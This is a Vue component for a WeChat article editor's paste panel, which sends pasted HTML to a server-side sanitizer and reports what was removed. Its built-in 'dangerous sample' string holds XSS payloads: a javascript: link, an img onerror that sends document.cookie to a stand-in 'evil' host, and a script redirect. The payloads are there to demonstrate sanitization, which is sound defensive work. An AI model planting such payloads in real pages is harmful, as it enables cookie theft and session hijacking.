<template>
  <div class="section">
    <h5>① 粘贴外部内容（经服务端清理）</h5>
    <textarea v-model="raw" class="paste-box" placeholder="把 Word / 网页 / 旧编辑器里的图文粘贴到这里，点击“服务端清理并生成模块”。脚本、事件属性、危险协议会在服务端被移除。"></textarea>
    <div class="row" style="margin-top:8px">
      <button class="btn primary" :disabled="loading" @click="doPaste">{{ loading ? '清理中…' : '服务端清理并生成模块' }}</button>
      <button class="btn" @click="raw = sample">填入危险样例</button>
    </div>

    <div v-if="result" style="margin-top:10px">
      <p class="report-line">生成模块：<b>{{ result.modules.length }}</b> 个 · 移除脚本：<b :class="{'danger-text': rpt.removedScripts}">{{ rpt.removedScripts }}</b> · 事件属性：<b :class="{'danger-text': rpt.removedEventAttrs.length}">{{ rpt.removedEventAttrs.length }}</b></p>
      <p class="report-line" v-if="rpt.dangerousLinks.length">
        <span class="danger-text">危险链接/资源 {{ rpt.dangerousLinks.length }} 个已拦截：</span>
      </p>
      <ul v-if="rpt.dangerousLinks.length" style="margin:4px 0 0 16px;padding:0;font-size:11px;color:#7a1d17">
        <li v-for="(d, i) in rpt.dangerousLinks" :key="i">
          &lt;{{ d.tag }}&gt; {{ d.protocol || d.reason }} → {{ d.url.slice(0, 48) }}
        </li>
      </ul>
      <div v-if="result.capabilities?.diffs?.length" style="margin-top:8px">
        <p class="report-line"><b>平台能力差异（微信公众号图文，非邮件规则）：</b></p>
        <div v-for="(d,i) in result.capabilities.diffs" :key="i" :class="'issue ' + (d.level==='error'?'error':'warning')">
          <span class="ico">{{ d.level === 'error' ? '⛔' : '⚠' }}</span><span>{{ d.message }}</span>
        </div>
      </div>
      <button class="btn primary" style="margin-top:8px" @click="$emit('ingested', result)">② 追加为结构化模块到当前草稿</button>
    </div>
  </div>
</template>

<script setup>
import { ref, computed } from 'vue';
import { api } from '../api.js';

const props = defineProps({ actor: String });
defineEmits(['ingested', 'toast']);
const raw = ref('');
const loading = ref(false);
const result = ref(null);
const rpt = computed(() => result.value?.report || {});

const sample = `<h2>活动预告</h2>
<p>点击 <a href="javascript:alert(1)" onclick="steal()">领奖</a>（危险链接），或访问 <a href="https://mp.weixin.qq.com/abc" target="_blank">正规链接</a>。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="fetch('//evil/'+document.cookie)"></p>
<${''}style>body{background:red}</${''}style>
<${''}script>document.location='https://evil.example'</${''}script>
<p style="color:#07c160;animation:blink 1s infinite;position:fixed;top:0">带动画和 fixed 定位的段落</p>`;

async function doPaste() {
  loading.value = true;
  try {
    const r = await api.paste(raw.value, props.actor);
    if (r.ok) result.value = r.body;
    else alert('清理失败：' + (r.body?.message || r.status));
  } finally {
    loading.value = false;
  }
}
</script>
